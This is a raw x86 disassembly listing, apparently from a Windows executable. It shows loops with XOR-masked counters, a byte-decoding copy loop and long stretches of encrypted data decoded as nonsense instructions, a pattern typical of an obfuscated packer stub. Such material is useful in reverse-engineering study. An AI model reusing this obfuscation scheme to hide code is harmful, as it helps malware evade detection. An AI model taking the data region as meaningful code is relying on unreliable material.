  40f393:	xor    ecx,DWORD PTR ds:0x433727
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x433727,ecx
  40f3a0:	cmp    DWORD PTR ds:0x433727,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x433727,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x433727
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x433727,ecx
  40f3d0:	cmp    DWORD PTR ds:0x433727,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x43362b
  40f3e3:	mov    ecx,DWORD PTR ds:0x433703
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x433657,0x13
  40f3fb:	cmp    DWORD PTR ds:0x433657,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x433657,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x433657
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x433657,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x4336ef,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x4336ef
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x4336ef,ecx
  40f444:	cmp    DWORD PTR ds:0x4336ef,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x4336ef,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x4336ef
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x4336ef,ecx
  40f474:	cmp    DWORD PTR ds:0x4336ef,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x4336db,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x4336db
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x4336db,edx
  40f498:	cmp    DWORD PTR ds:0x4336db,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433891
  40f4af:	push   0x4338e7
  40f4b4:	push   0x4338cb
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x4336db,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433717
  40f4d2:	adc    DWORD PTR ds:0x433727,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax-0x27438bc7]
  40f540:	out    0xd4,eax
  40f542:	lods   al,BYTE PTR ds:[esi]
  40f543:	jle    0x40f5c3
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	jmp    0x40f53f
  40f54b:	adc    BYTE PTR [esi+0x5e],0xda
  40f54f:	adc    cl,BYTE PTR [edi+0x57]
  40f552:	fs out 0xb8,eax
  40f555:	jl     0x40f549
  40f557:	sbb    DWORD PTR [esi],esp
  40f559:	inc    edi
  40f55a:	sub    bh,ah
  40f55c:	or     al,0x2e
  40f55e:	adc    DWORD PTR [ecx],0xea9009b3
  40f564:	dec    ebx
  40f565:	jmp    0x40f53e
  40f567:	push   0xffffffd8
  40f569:	push   edx
  40f56a:	inc    ebx
  40f56b:	test   ch,0x24
  40f56e:	cmp    BYTE PTR [edx+0x7cd362b],0xdc
  40f575:	mov    es,esp
  40f577:	(bad)  
  40f578:	inc    eax
  40f579:	addr16 inc edx
  40f57b:	pop    ds
  40f57c:	ins    BYTE PTR es:[edi],dx
  40f57d:	outs   dx,DWORD PTR es:[esi]
  40f57f:	in     eax,0x2f
  40f581:	rcl    BYTE PTR [esi+esi*1+0x995b4f4],0x1b
  40f589:	cmp    DWORD PTR [ebx+0x32],0xf7917185
  40f590:	and    al,0x16
  40f592:	and    ebp,0xffffffe4
  40f595:	adc    eax,0xbee069bd
  40f59a:	add    BYTE PTR [edi+0x21],0xdb
  40f59e:	cs cmp bh,bh
  40f5a1:	in     eax,dx
  40f5a2:	neg    DWORD PTR [edi-0xe]
  40f5a5:	inc    esp
  40f5a6:	xchg   ebx,eax
  40f5a7:	pop    esi
  40f5a8:	push   es
  40f5a9:	push   eax
  40f5aa:	dec    edx
  40f5ab:	jmp    0x7732ba79
  40f5b0:	neg    BYTE PTR [esp+edi*4+0x5a4e12f4]
  40f5b7:	aaa    
  40f5b8:	or     dh,ah
  40f5ba:	test   edi,eax
  40f5bc:	sbb    edx,DWORD PTR [edi]
  40f5be:	xor    DWORD PTR [ebx+0x63],ecx
  40f5c1:	mov    es,WORD PTR [edi+edi*1-0x52]
  40f5c5:	ret    
  40f5c6:	pushf  
  40f5c7:	jmp    0x40f5c0
  40f5c9:	push   eax
  40f5ca:	jno    0x40f582
  40f5cc:	lods   al,BYTE PTR ds:[esi]
  40f5cd:	bound  eax,QWORD PTR [ebx]
  40f5cf:	imul   esp,ebp,0xffffffe8
  40f5d2:	pop    edx
  40f5d3:	ins    DWORD PTR es:[edi],dx
  40f5d4:	in     al,dx
  40f5d5:	sbb    eax,0xde1c05c7
  40f5da:	lds    edi,FWORD PTR [ecx-0xa]
  40f5dd:	int    0xad
  40f5df:	out    dx,al
  40f5e0:	loop   0x40f59f
  40f5e2:	sahf   
  40f5e3:	loop   0x40f637
  40f5e5:	lock clc 
  40f5e7:	adc    BYTE PTR [edi+0xfdc60e4],dh
  40f5ed:	out    0xe,al
  40f5ef:	test   DWORD PTR [esi+0x17],esp
  40f5f2:	mov    al,ds:0xf8ce682a
  40f5f7:	dec    esi
  40f5f8:	gs (bad) 
  40f5fb:	imul   esp,edx,0xfffffffa
  40f5fe:	xor    eax,0x16448e64
  40f603:	pop    ebx
  40f604:	test   al,0x18
  40f606:	test   DWORD PTR [edx+0x6b],esp
  40f609:	inc    ebp
  40f60a:	sbb    edx,DWORD PTR [edx+0x22]
  40f60d:	inc    edx
  40f60e:	aas    
  40f60f:	and    bl,0x54
  40f612:	mov    ah,0x4d
  40f614:	ret    0x9d8a
  40f617:	sub    ecx,ebp
  40f619:	(bad)  
  40f61c:	mov    eax,ds:0x8682fbeb
  40f621:	cli    
  40f622:	xchg   edx,eax
  40f623:	mov    edx,0xb76f5afa
  40f628:	xor    esp,ebx
  40f62a:	dec    ebp
  40f62b:	add    al,0xbc
  40f62d:	mov    ah,0xfe
  40f62f:	popa   
  40f630:	jecxz  0x40f656
  40f632:	out    0x27,eax
  40f634:	mov    WORD PTR [eax-0x19],?
  40f637:	out    dx,al
  40f638:	and    esp,0xa8a03fa3
  40f63e:	int3   
  40f63f:	inc    edx
  40f640:	fucomip st,st(4)
  40f642:	daa    
  40f643:	dec    ecx
  40f644:	pop    edi
  40f645:	mov    esp,0xd2490f3d
  40f64a:	aaa    
  40f64b:	out    dx,eax
  40f64c:	push   es
  40f64d:	dec    ecx
  40f64e:	adc    edi,DWORD PTR [ecx+0x24]
  40f651:	push   ebx
  40f652:	pusha  
  40f653:	jns    0x40f6a2
  40f655:	xchg   ebp,eax
  40f656:	sti    
  40f657:	es jbe 0x40f694
  40f65a:	test   al,0x58
  40f65c:	jne    0x40f61f
  40f65e:	(bad)  
  40f65f:	out    0x9b,eax
  40f661:	push   0xd358fa07
  40f666:	xor    BYTE PTR [esi-0x36],bh
  40f669:	jnp    0x40f68e
  40f66b:	xchg   edx,eax
  40f66c:	repnz mov ch,0x5a
  40f66f:	cmp    BYTE PTR [esi+0x32],bl
  40f672:	add    edx,DWORD PTR [edx-0x7c]
  40f675:	lea    edx,[ecx]
  40f677:	fisttp WORD PTR [esp+ecx*8]
  40f67a:	jnp    0x40f659
  40f67c:	dec    ecx
  40f67d:	popa   
  40f67e:	clc    
  40f67f:	(bad)  
  40f680:	xchg   ebx,eax
  40f681:	test   BYTE PTR [edi-0x2b],ah
  40f684:	or     al,0x71
  40f686:	dec    edx
  40f687:	call   0xbadf:0xc4f4eb6f
  40f68e:	push   0x2b
  40f690:	add    al,0xde
  40f692:	and    al,0x98
  40f694:	std    
  40f695:	mul    BYTE PTR [eax+0x1e7c93a6]
  40f69b:	jo     0x40f652
  40f69d:	pop    esp
  40f69e:	das    
  40f69f:	add    BYTE PTR [edx+0x5365c55c],0x4c
  40f6a6:	mov    ebx,0x5e89d10
  40f6ab:	repz adc edx,DWORD PTR [edx+0x447cf6d9]
  40f6b2:	in     eax,dx
  40f6b3:	stc    
  40f6b4:	push   edx
  40f6b5:	push   esi
  40f6b6:	jp     0x40f69d
  40f6b8:	(bad)  
  40f6b9:	ins    DWORD PTR es:[edi],dx
  40f6ba:	push   ecx
  40f6bb:	icebp  
  40f6bc:	inc    eax
  40f6bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6be:	aam    0x28
  40f6c0:	push   ds
  40f6c1:	daa    
  40f6c2:	or     eax,0xe28cfb07
  40f6c7:	or     al,0x28
  40f6c9:	cli    
  40f6ca:	clc    
  40f6cb:	xor    al,0x5
  40f6cd:	cmp    al,0x97
  40f6cf:	and    DWORD PTR ds:0xd24fc965,esp
  40f6d5:	add    al,0x7d
  40f6d7:	push   ebx
  40f6d8:	fs daa 
  40f6da:	push   ds
  40f6db:	stos   DWORD PTR es:[edi],eax
  40f6dc:	stos   BYTE PTR es:[edi],al
  40f6dd:	imul   edx,esp,0x6fe68f70
  40f6e3:	aad    0x96
  40f6e5:	in     eax,dx
  40f6e6:	adc    ebx,DWORD PTR [edi+0x6f]
  40f6e9:	addr16 inc ecx
  40f6eb:	adc    eax,0xfe37d074
  40f6f0:	rcl    BYTE PTR [ebx],cl
  40f6f2:	div    BYTE PTR [edi-0x79f808da]
  40f6f8:	mov    eax,ds:0xf7f373b1
  40f6fd:	inc    ebp
  40f6fe:	cld    
  40f6ff:	mov    bh,0x1e
  40f701:	lahf   
  40f702:	inc    esp
  40f703:	cmp    DWORD PTR [ebx+0x79222184],eax
  40f709:	cwde   
  40f70a:	(bad)  
  40f70b:	ror    BYTE PTR [edi+ecx*4+0x1c],1
  40f70f:	sub    ebx,DWORD PTR [edx-0x6253665e]
  40f715:	into   
  40f716:	mov    gs,ebp
  40f718:	sbb    BYTE PTR [ebp+0x6ed5adff],ch
  40f71e:	push   cs
  40f71f:	xchg   ebx,eax
  40f720:	cmp    eax,0xb1499de0
  40f725:	fwait
  40f726:	adc    edi,DWORD PTR [ecx-0x2e1690e5]
  40f72c:	ja     0x40f7a2
  40f72e:	and    ecx,edi
  40f730:	mov    cl,0xb2
  40f732:	mul    al
  40f734:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f735:	imul   edi,eax,0x6f
  40f738:	hlt    
  40f739:	dec    esi
  40f73a:	dec    esp
  40f73b:	call   0xe1d7:0xe957aafd
  40f742:	mov    ds:0xc859cb5b,eax
  40f747:	xchg   edi,eax
  40f748:	xchg   BYTE PTR [edx+0x4701f1cf],al
  40f74e:	push   ebx
  40f74f:	popf   
  40f750:	jge    0x40f764
  40f752:	out    dx,eax
  40f753:	addr16 pop ebx
  40f755:	jle    0x40f73c
  40f757:	in     eax,dx
  40f758:	jmp    0x40f701
  40f75a:	cli    
  40f75b:	jns    0x40f737
  40f75d:	dec    ebx
  40f75e:	mul    BYTE PTR [ebp+0x1e142243]
  40f764:	call   0x82be:0x3c4c6bdb
  40f76b:	ins    BYTE PTR es:[edi],dx
  40f76c:	dec    ecx
  40f76d:	sub    eax,DWORD PTR [esp+edx*2+0x31f2c68f]
  40f774:	mov    ds,WORD PTR ds:0x497da2a4
  40f77a:	push   esp
  40f77b:	adc    ah,cl
  40f77d:	dec    edx
  40f77e:	shl    DWORD PTR [esi],0xe4
  40f781:	cmp    dh,bh
  40f783:	int3   
  40f784:	push   cs
  40f785:	mov    dh,BYTE PTR [bp+di]
  40f788:	frstor [ebx+0x4]
  40f78b:	xchg   edx,eax
  40f78c:	out    dx,al
  40f78d:	cmp    eax,0xa5c091f0
  40f792:	stos   BYTE PTR es:[edi],al
  40f793:	pop    esp
  40f794:	adc    al,0x27
  40f796:	or     al,BYTE PTR [edx+0xd46435f]
  40f79c:	cmp    BYTE PTR [ecx+0x56d232b1],ah
  40f7a2:	ror    BYTE PTR es:[edx-0x7c],0x74
  40f7a7:	jbe    0x40f748
  40f7a9:	rcl    esi,0x6b
  40f7ac:	pop    esi
  40f7ad:	xchg   DWORD PTR [esi],edi
  40f7af:	dec    eax
  40f7b0:	sbb    BYTE PTR [edx],dh
  40f7b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7b3:	ret    
  40f7b4:	lock stos BYTE PTR es:[edi],al
  40f7b6:	sub    BYTE PTR [esp+ebp*4],0x68
  40f7ba:	aas    
  40f7bb:	xor    eax,0xc51df32
  40f7c0:	xchg   edx,eax
  40f7c1:	test   DWORD PTR [ecx+0x13b51d70],esi
  40f7c7:	sbb    al,0x78
  40f7c9:	enter  0xcae2,0xd0
  40f7cd:	cmp    BYTE PTR [edi],0xe0
  40f7d0:	lods   eax,DWORD PTR ds:[esi]
  40f7d1:	mov    bl,0x5d
  40f7d3:	add    bl,ah
  40f7d5:	shl    DWORD PTR [ebx-0x5617fd3e],cl
  40f7db:	jecxz  0x40f7d7
  40f7dd:	xor    BYTE PTR [eax-0x6175ed45],bl
  40f7e3:	push   es
  40f7e4:	je     0x40f859
  40f7e6:	outs   dx,DWORD PTR ds:[esi]
  40f7e7:	push   ecx
  40f7e8:	aam    0x49
  40f7ea:	pop    ds
  40f7eb:	out    0x67,eax
  40f7ed:	fs mov dl,0x3c
  40f7f0:	hlt    
  40f7f1:	por    mm1,mm2
  40f7f4:	push   esi
  40f7f5:	dec    eax
  40f7f6:	sbb    BYTE PTR [esi+0x5b8df276],bl
  40f7fc:	adc    DWORD PTR [ebx-0x39],eax
  40f7ff:	adc    BYTE PTR [ebp-0x54],ah
  40f802:	into   
  40f803:	push   edi
  40f804:	es jno 0x40f7d1
  40f807:	mov    esp,0x17ce47dc
  40f80c:	shl    BYTE PTR [ebx+0x7d01f0b1],cl
  40f812:	pusha  
  40f813:	add    BYTE PTR [edi],dh
  40f815:	or     al,0x6c
  40f817:	jl     0x40f7fc
  40f819:	pop    ecx
  40f81a:	mov    ds:0x567f03ff,al
  40f81f:	inc    eax
  40f820:	xor    al,bh
  40f822:	sbb    DWORD PTR [ebx-0x32cef2fb],esp
  40f828:	and    BYTE PTR [edi],dh
  40f82a:	inc    edx
  40f82b:	push   ss
  40f82c:	lfs    ecx,FWORD PTR [esi+ecx*8-0x72764eda]
  40f834:	dec    esp
  40f835:	and    dh,al
  40f837:	inc    ecx
  40f838:	or     BYTE PTR [edi+0x4df4b265],0x2f
  40f83f:	xor    DWORD PTR [eax+0x65],0xa5e21405
  40f846:	mov    eax,ds:0xc0bdc3bf
  40f84b:	xor    edi,ecx
  40f84d:	add    edi,esi
  40f84f:	mov    esi,DWORD PTR [ebp+0x8]
  40f852:	imul   edi,edx
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0xd819d83f
  40f897:	or     dl,dl
  40f899:	stos   DWORD PTR es:[edi],eax
  40f89a:	jle    0x40f91a
  40f89c:	jl     0x40f91b
  40f89e:	jle    0x40f91e
  40f8a0:	adc    al,0x31
  40f8a2:	inc    eax
  40f8a3:	ins    DWORD PTR es:[edi],dx
  40f8a4:	cmp    al,0x9
  40f8a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8a7:	adc    BYTE PTR [ecx+0x69],al
  40f8aa:	iret   
  40f8ab:	stc    
  40f8ac:	retf   
  40f8ad:	push   edi
  40f8ae:	lahf   
  40f8af:	fnstcw WORD PTR [ebx+0x34]
  40f8b2:	push   0xfffffffc
  40f8b4:	cmc    
  40f8b5:	xchg   BYTE PTR [edi-0x2c],al
  40f8b8:	data16 lahf 
  40f8ba:	popf   
  40f8bb:	scas   al,BYTE PTR es:[edi]
  40f8bc:	pop    edx
  40f8bd:	mov    edi,0xf70fd67e
  40f8c2:	shl    BYTE PTR [ecx+0x6d936bfa],1
  40f8c8:	repnz cmp esi,DWORD PTR [eax+0x13]
  40f8cc:	mov    al,0x78
  40f8ce:	dec    eax
  40f8cf:	mov    DWORD PTR [ebx+ecx*2],0x63151a5
  40f8d6:	sbb    eax,0x57ddf13b
  40f8db:	inc    edi
  40f8dc:	lock push ebx
  40f8de:	shl    BYTE PTR cs:[eax+0x48],0x12
  40f8e3:	clc    
  40f8e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8e5:	dec    ebp
  40f8e6:	jecxz  0x40f8ab
  40f8e8:	in     eax,0x33
  40f8ea:	inc    ecx
  40f8eb:	lods   eax,DWORD PTR ds:[esi]
  40f8ec:	in     al,0x74
  40f8ee:	and    dh,BYTE PTR [esi]
  40f8f0:	ins    BYTE PTR es:[edi],dx
  40f8f1:	push   esp
  40f8f2:	dec    edx
  40f8f3:	xchg   DWORD PTR [edx],ecx
  40f8f5:	mov    al,ds:0x33df3f4
  40f8fa:	jg     0x40f8fd
  40f8fc:	sti    
  40f8fd:	imul   ebp,DWORD PTR [ebx],0xf003ddd1
  40f903:	jecxz  0x40f954
  40f905:	not    al
  40f907:	adc    BYTE PTR [eax+0x4ac41c51],ch
  40f90d:	repnz cli 
  40f90f:	or     edi,ebx
  40f911:	in     al,0xe4
  40f913:	xor    al,0xe3
  40f915:	jecxz  0x40f946
  40f917:	sub    DWORD PTR [edx+0x68],ecx
  40f91a:	mov    BYTE PTR [eax],cl
  40f91c:	ficom  DWORD PTR [ecx+0x37]
  40f91f:	leavew 
  40f921:	jl     0x40f97c
  40f923:	jno    0x40f99f
  40f925:	rcr    BYTE PTR [eax+0x41ac8ba0],0x41
  40f92c:	mov    ds:0xb7226b03,eax
  40f931:	(bad)  
  40f932:	popa   
  40f933:	xor    BYTE PTR [edx],0xe8
  40f936:	adc    BYTE PTR [ecx],al
  40f938:	test   al,0x48
  40f93a:	sbb    DWORD PTR [edx+0x490110bc],edi
  40f940:	jb     0x40f938
  40f942:	ret    
  40f943:	out    dx,al
  40f944:	sub    al,0x78
  40f946:	(bad)  
  40f947:	xor    eax,0x3be68f17
  40f94c:	dec    ecx
  40f94d:	xor    eax,0xbb6e0516
  40f952:	ud0    ecx,DWORD PTR [edi]
  40f955:	jns    0x40f902
  40f957:	lds    edx,FWORD PTR [ebp+ecx*2-0x5a41539b]
  40f95e:	or     al,bh
  40f960:	fs sahf 
  40f962:	pusha  
  40f963:	je     0x40f933
  40f965:	cs das 
  40f967:	dec    edi
  40f968:	fwait
  40f969:	xor    dl,BYTE PTR [ebx+0x4771954d]
  40f96f:	sti    
  40f970:	cli    
  40f971:	outs   dx,WORD PTR fs:[esi]
  40f974:	push   cs
  40f975:	pushf  
  40f976:	dec    BYTE PTR [edx+0x62]
  40f979:	retf   
  40f97a:	push   ss
  40f97b:	sbb    DWORD PTR [eax-0xd],edx
  40f97e:	retf   0x7b2a
  40f981:	pop    ebp
  40f982:	xchg   dl,ch
  40f984:	xor    esp,DWORD PTR [ebp+0x50c0289f]
  40f98a:	fsub   st,st(0)
  40f98c:	scas   eax,DWORD PTR es:[edi]
  40f98d:	lods   eax,DWORD PTR ds:[esi]
  40f98e:	pusha  
  40f98f:	pop    ecx
  40f990:	add    eax,0x2761f690
  40f995:	pushf  
  40f996:	or     ah,BYTE PTR [esi-0x6ce7349e]
  40f99c:	sub    dh,BYTE PTR [ebx+0x2f]
  40f99f:	lods   eax,DWORD PTR ds:[esi]
  40f9a0:	mov    ds:0xb5bb1428,al
  40f9a5:	mov    edi,0x91133dc2
  40f9aa:	mov    dh,0x62
  40f9ac:	test   BYTE PTR [bx+di-0x391c],al
  40f9b1:	cmp    bl,BYTE PTR [edx]
  40f9b3:	cmp    eax,0x4586904e
  40f9b8:	loopne 0x40f991
  40f9ba:	retf   
  40f9bb:	pop    edx
  40f9bc:	test   al,0x23
  40f9be:	inc    ebx
  40f9bf:	(bad)  
  40f9c0:	aam    0x2c
  40f9c2:	aaa    
  40f9c3:	push   ebp
  40f9c4:	(bad)  
  40f9c5:	in     al,dx
  40f9c6:	popf   
  40f9c7:	mov    eax,DWORD PTR [ecx+0x5a]
  40f9ca:	push   0xb8c475e8
  40f9cf:	push   cs
  40f9d0:	sub    DWORD PTR [ecx],ebx
  40f9d2:	cli    
  40f9d3:	sub    DWORD PTR [ecx+0x385a08bc],edx
  40f9d9:	push   ecx
  40f9da:	jge    0x40f9b1
  40f9dc:	sub    eax,0x7cab513
  40f9e1:	hlt    
  40f9e2:	rol    DWORD PTR [esi+0x6bec5e4b],1
  40f9e8:	sbb    BYTE PTR [edx-0x39],cl
  40f9eb:	shr    DWORD PTR [esi],1
  40f9ed:	xchg   edx,eax
  40f9ee:	fidiv  WORD PTR [esi+0x52]
  40f9f1:	push   eax
  40f9f2:	mov    cs,WORD PTR [edx+edx*8]
  40f9f5:	pop    edi
  40f9f6:	rcr    DWORD PTR [ecx],0x12
  40f9f9:	add    al,al
  40f9fb:	test   BYTE PTR [eax+0x71],dl
  40f9fe:	xchg   esp,eax
  40f9ff:	cmp    esp,DWORD PTR [ebp-0x78]
  40fa02:	cmp    DWORD PTR [ebp+edi*4+0x1571222b],eax
  40fa09:	mov    ds:0xa8f8dde5,eax
  40fa0e:	aaa    
  40fa0f:	fcom   DWORD PTR [eax]
  40fa11:	and    bl,ah
  40fa13:	and    BYTE PTR [esi+0x7c8e8d21],al
  40fa19:	adc    BYTE PTR [edi+0x235b5e56],bh
  40fa1f:	xchg   esp,eax
  40fa20:	fsub   QWORD PTR gs:[ecx+0x60dee5b0]
  40fa27:	ret    0x3ea4
  40fa2a:	inc    esi
  40fa2b:	jmp    0x40f9e8
  40fa2d:	mov    edx,0x2e915fb3
  40fa32:	push   ss
  40fa33:	push   0xe9b3204f
  40fa38:	or     al,0x5a
  40fa3b:	sub    eax,0x945722ee
  40fa40:	out    0xfb,al
  40fa42:	enter  0x8466,0x19
  40fa46:	rcr    dh,0xa1
  40fa49:	xor    al,0x9f
  40fa4b:	pop    ebx
  40fa4c:	in     al,dx
  40fa4d:	aaa    
  40fa4e:	pop    es
  40fa4f:	xchg   ecx,eax
  40fa50:	adc    al,0x23
  40fa52:	js     0x40fac7
  40fa54:	ins    BYTE PTR es:[edi],dx
  40fa55:	in     al,0xaa
  40fa57:	sbb    ebx,DWORD PTR [eax+0x78d231c9]
  40fa5d:	adc    al,cl
  40fa5f:	in     al,0x53
  40fa61:	test   al,0x6c
  40fa63:	out    0x54,al
  40fa65:	cwde   
  40fa66:	mov    al,ds:0x5c6acf00
  40fa6b:	dec    ebx
  40fa6c:	pop    edi
  40fa6d:	mov    dl,0x33
  40fa6f:	push   ecx
  40fa70:	mov    edi,0x20ab2a3d
  40fa75:	xor    ecx,DWORD PTR [ebx-0x62359414]
  40fa7b:	push   0x2984bef8
  40fa80:	cmp    edi,0x5e
  40fa83:	jg     0x40fa5d
  40fa85:	jmp    0x40fa9a
  40fa87:	xor    ebx,DWORD PTR [eax+0x34]
  40fa8a:	lock pop edi
  40fa8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa8d:	cwde   
  40fa8e:	int    0xbc
  40fa90:	or     edx,edi
  40fa92:	shl    DWORD PTR [ebx],cl
  40fa94:	ret    0xa6c7
  40fa97:	lea    ebx,[ebp+0x7f62878]
  40fa9d:	(bad)  [ebp-0x1b]
  40faa0:	jo     0x40fa2a
  40faa2:	push   ecx
  40faa3:	mov    esi,0x77a22643
  40faa8:	fst    QWORD PTR [ebp+0x4cb7dfe5]
  40faae:	pop    edx
  40faaf:	mov    eax,0x2f617723
  40fab4:	pop    esi
  40fab5:	cmp    BYTE PTR [eax],0x16
  40fab8:	cmp    al,dh
  40faba:	pop    ebx
  40fabb:	cld    
  40fabc:	mov    dh,ch
  40fabe:	xchg   edi,eax
  40fabf:	push   ecx
  40fac0:	nop
  40fac1:	pop    eax
  40fac2:	sbb    DWORD PTR [esi],ebx
  40fac4:	outs   dx,DWORD PTR ds:[esi]
  40fac5:	frstor [ecx+0x6dea4309]
  40facb:	and    DWORD PTR [ecx-0x14],esi
  40face:	cdq    
  40facf:	ins    DWORD PTR es:[edi],dx
  40fad0:	sub    al,0xb8
  40fad2:	jmp    0x40fa92
  40fad4:	arpl   WORD PTR [ebx],bp
  40fad6:	xchg   ebx,eax
  40fad7:	test   eax,0x9c0aa65a
  40fadc:	or     BYTE PTR [ecx+0x538e3b9e],dh
  40fae2:	les    ecx,FWORD PTR [edi]
  40fae4:	cs or  eax,0xbf96bb1a
  40faea:	popf   
  40faeb:	ins    BYTE PTR es:[edi],dx
  40faec:	dec    edx
  40faed:	jmp    0x4719:0x37c85834
  40faf4:	pop    ebx
  40faf5:	fs call 0xc0ea:0x9dfa90bf
  40fafd:	retf   
  40fafe:	addr16 inc esp
  40fb00:	push   ds
  40fb01:	jg     0x40fb66
  40fb03:	xchg   edi,eax
  40fb04:	icebp  
  40fb05:	push   esi
  40fb06:	adc    eax,0x9c4badaf
  40fb0b:	ror    DWORD PTR [eiz*2-0x69d8dd63],0xa1
  40fb13:	xchg   edx,ebp
  40fb15:	inc    esp
  40fb16:	(bad)  
  40fb17:	in     eax,dx
  40fb18:	jo     0x40fb74
  40fb1a:	mov    al,0x3b
  40fb1c:	or     DWORD PTR [eax+0x5f3dba41],eax
  40fb22:	sar    BYTE PTR [esi+0x4a],0xbd
  40fb26:	xchg   ecx,eax
  40fb27:	lahf   
  40fb28:	clc    
  40fb29:	xor    edi,DWORD PTR [edi]
  40fb2b:	(bad)  
  40fb2d:	dec    eax
  40fb2e:	pushf  
  40fb2f:	xchg   esp,eax
  40fb30:	std    
  40fb31:	and    BYTE PTR [esi],0x35
  40fb34:	call   0x8bd4:0x534b505d
  40fb3b:	mov    edx,DWORD PTR [eax]
  40fb3d:	loope  0x40fb26
  40fb3f:	dec    ebx
  40fb40:	jne    0x40fb35
  40fb42:	dec    edi
  40fb43:	fwait
  40fb44:	lods   al,BYTE PTR ds:[esi]
  40fb45:	push   esi
  40fb46:	pop    ebp
  40fb47:	adc    eax,0x77bbcbe6
  40fb4c:	pop    ss
  40fb4d:	hlt    
  40fb4e:	cmp    al,0x1d
  40fb50:	clc    
  40fb51:	jae    0x40fb83
  40fb53:	push   esp
  40fb54:	je     0x40fb04
  40fb56:	loop   0x40fafc
  40fb58:	sub    dl,BYTE PTR [ebp-0x80]
  40fb5b:	int    0xe6
  40fb5d:	and    al,0xfb
  40fb5f:	push   0x7f
  40fb61:	sub    al,0xbd
  40fb63:	scas   al,BYTE PTR es:[edi]
  40fb64:	sbb    DWORD PTR [edx+ebp*8-0x487a04f5],0x8a3013f2
  40fb6f:	ins    BYTE PTR es:[edi],dx
  40fb70:	or     eax,0x6abab92e
  40fb75:	push   edx
  40fb76:	push   esi
  40fb77:	jle    0x40fb9f
  40fb79:	add    eax,0x75b8516a
  40fb7e:	mov    dh,dh
  40fb80:	and    al,0x87
  40fb82:	push   0x9c36a0f0
  40fb87:	add    eax,0xdfebfa22
  40fb8c:	mov    al,0xce
  40fb8e:	scas   eax,DWORD PTR es:[edi]
  40fb8f:	inc    esi
  40fb90:	das    
  40fb91:	xor    cl,BYTE PTR [ebx]
  40fb93:	mov    edx,DWORD PTR [ebp-0x5cb7a5b8]
